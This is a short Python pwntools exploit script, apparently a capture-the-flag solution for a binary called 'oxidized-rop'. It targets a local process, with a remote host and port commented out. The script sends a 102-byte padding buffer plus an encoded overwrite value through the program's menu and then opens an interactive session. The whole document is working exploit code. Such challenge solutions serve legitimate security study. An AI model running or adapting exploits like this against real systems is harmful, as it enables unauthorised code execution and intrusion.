from pwn import *

io = process("./oxidized-rop")
#io = remote("94.237.53.3", 44428)

offset = 102 

io.sendlineafter(":", b"1")

io.sendlineafter(":", b"A"*offset + chr(123456).encode())

io.sendlineafter(":", b"2")

io.interactive()
